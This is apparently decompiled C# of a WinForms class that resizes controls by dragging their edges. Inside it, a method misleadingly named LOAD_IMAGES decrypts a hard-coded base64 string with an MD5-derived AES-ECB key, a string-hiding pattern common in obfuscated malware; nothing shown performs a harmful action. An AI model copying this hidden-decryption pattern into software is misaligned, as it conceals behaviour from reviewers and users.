using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

// Token: 0x020000B0 RID: 176
public class ResizeableControl
{
	// Token: 0x17000109 RID: 265
	// (get) Token: 0x06000757 RID: 1879 RVA: 0x000AFD8C File Offset: 0x000ADF8C
	// (set) Token: 0x06000758 RID: 1880 RVA: 0x000AFDA4 File Offset: 0x000ADFA4
	internal Control mControl
	{
		[CompilerGenerated]
		get
		{
			return this._mControl;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			MouseEventHandler value2 = new MouseEventHandler(this.mControl_MouseDown);
			MouseEventHandler value3 = new MouseEventHandler(this.mControl_MouseUp);
			MouseEventHandler value4 = new MouseEventHandler(this.mControl_MouseMove);
			EventHandler value5 = new EventHandler(this.mControl_MouseLeave);
			Control mControl = this._mControl;
			if (mControl != null)
			{
				mControl.MouseDown -= value2;
				mControl.MouseUp -= value3;
				mControl.MouseMove -= value4;
				mControl.MouseLeave -= value5;
			}
			this._mControl = value;
			mControl = this._mControl;
			if (mControl != null)
			{
				mControl.MouseDown += value2;
				mControl.MouseUp += value3;
				mControl.MouseMove += value4;
				mControl.MouseLeave += value5;
			}
		}
	}

	// Token: 0x06000759 RID: 1881 RVA: 0x000034C7 File Offset: 0x000016C7
	public ResizeableControl(Control Control)
	{
		this.mMouseDown = false;
		this.mEdge = ResizeableControl.EdgeEnum.None;
		this.mWidth = 4;
		this.mOutlineDrawn = false;
		this.mControl = Control;
	}

	// Token: 0x0600075A RID: 1882 RVA: 0x000AFE4C File Offset: 0x000AE04C
	private void mControl_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			this.mMouseDown = true;
		}
	}

	// Token: 0x0600075B RID: 1883 RVA: 0x000034F2 File Offset: 0x000016F2
	private void mControl_MouseUp(object sender, MouseEventArgs e)
	{
		this.mMouseDown = false;
	}

	// Token: 0x0600075C RID: 1884 RVA: 0x000AFE70 File Offset: 0x000AE070
	private void mControl_MouseMove(object sender, MouseEventArgs e)
	{
		Control control = (Control)sender;
		Graphics graphics = control.CreateGraphics();
		checked
		{
			switch (this.mEdge)
			{
			case ResizeableControl.EdgeEnum.None:
				if (this.mOutlineDrawn)
				{
					control.Refresh();
					this.mOutlineDrawn = false;
				}
				break;
			case ResizeableControl.EdgeEnum.Right:
				graphics.FillRectangle(Brushes.RoyalBlue, control.Width - this.mWidth, 0, control.Width, control.Height);
				this.mOutlineDrawn = true;
				break;
			case ResizeableControl.EdgeEnum.Left:
				graphics.FillRectangle(Brushes.RoyalBlue, 0, 0, this.mWidth, control.Height);
				this.mOutlineDrawn = true;
				break;
			case ResizeableControl.EdgeEnum.Top:
				graphics.FillRectangle(Brushes.RoyalBlue, 0, 0, control.Width, this.mWidth);
				this.mOutlineDrawn = true;
				break;
			case ResizeableControl.EdgeEnum.Bottom:
				graphics.FillRectangle(Brushes.RoyalBlue, 0, control.Height - this.mWidth, control.Width, this.mWidth);
				this.mOutlineDrawn = true;
				break;
			case ResizeableControl.EdgeEnum.TopLeft:
				graphics.FillRectangle(Brushes.RoyalBlue, 0, 0, this.mWidth * 4, this.mWidth * 4);
				this.mOutlineDrawn = true;
				break;
			}
			if (this.mMouseDown & this.mEdge > ResizeableControl.EdgeEnum.None)
			{
				control.SuspendLayout();
				switch (this.mEdge)
				{
				case ResizeableControl.EdgeEnum.Right:
					control.SetBounds(control.Left, control.Top, control.Width - (control.Width - e.X), control.Height);
					break;
				case ResizeableControl.EdgeEnum.Left:
					control.SetBounds(control.Left + e.X, control.Top, control.Width - e.X, control.Height);
					break;
				case ResizeableControl.EdgeEnum.Top:
					control.SetBounds(control.Left, control.Top + e.Y, control.Width, control.Height - e.Y);
					break;
				case ResizeableControl.EdgeEnum.Bottom:
					control.SetBounds(control.Left, control.Top, control.Width, control.Height - (control.Height - e.Y));
					break;
				case ResizeableControl.EdgeEnum.TopLeft:
					control.SetBounds(control.Left + e.X, control.Top + e.Y, control.Width, control.Height);
					break;
				}
				control.ResumeLayout();
			}
			else
			{
				bool flag = true;
				if (e.X <= this.mWidth * 4 & e.Y <= this.mWidth * 4)
				{
					control.Cursor = Cursors.SizeAll;
					this.mEdge = ResizeableControl.EdgeEnum.TopLeft;
				}
				else if (flag == e.X <= this.mWidth)
				{
					control.Cursor = Cursors.VSplit;
					this.mEdge = ResizeableControl.EdgeEnum.Left;
				}
				else if (flag == e.X > control.Width - (this.mWidth + 1))
				{
					control.Cursor = Cursors.VSplit;
					this.mEdge = ResizeableControl.EdgeEnum.Right;
				}
				else if (flag == e.Y <= this.mWidth)
				{
					control.Cursor = Cursors.HSplit;
					this.mEdge = ResizeableControl.EdgeEnum.Top;
				}
				else if (flag == e.Y > control.Height - (this.mWidth + 1))
				{
					control.Cursor = Cursors.HSplit;
					this.mEdge = ResizeableControl.EdgeEnum.Bottom;
				}
				else
				{
					control.Cursor = Cursors.Default;
					this.mEdge = ResizeableControl.EdgeEnum.None;
				}
			}
		}
	}

	// Token: 0x0600075D RID: 1885 RVA: 0x000B01EC File Offset: 0x000AE3EC
	private void mControl_MouseLeave(object sender, EventArgs e)
	{
		Control control = (Control)sender;
		this.mEdge = ResizeableControl.EdgeEnum.None;
		control.Refresh();
	}

	// Token: 0x0600075E RID: 1886 RVA: 0x000B0210 File Offset: 0x000AE410
	internal static string LOAD_IMAGES(string v)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(v));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String("HCiHZ9y2uvml4p66X/Hqxw==");
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	// Token: 0x04000A9D RID: 2717
	private bool mMouseDown;

	// Token: 0x04000A9E RID: 2718
	public ResizeableControl.EdgeEnum mEdge;

	// Token: 0x04000A9F RID: 2719
	private int mWidth;

	// Token: 0x04000AA0 RID: 2720
	private bool mOutlineDrawn;

	// Token: 0x020000B1 RID: 177
	public enum EdgeEnum
	{
		// Token: 0x04000AA2 RID: 2722
		None,
		// Token: 0x04000AA3 RID: 2723
		Right,
		// Token: 0x04000AA4 RID: 2724
		Left,
		// Token: 0x04000AA5 RID: 2725
		Top,
		// Token: 0x04000AA6 RID: 2726
		Bottom,
		// Token: 0x04000AA7 RID: 2727
		TopLeft
	}
}
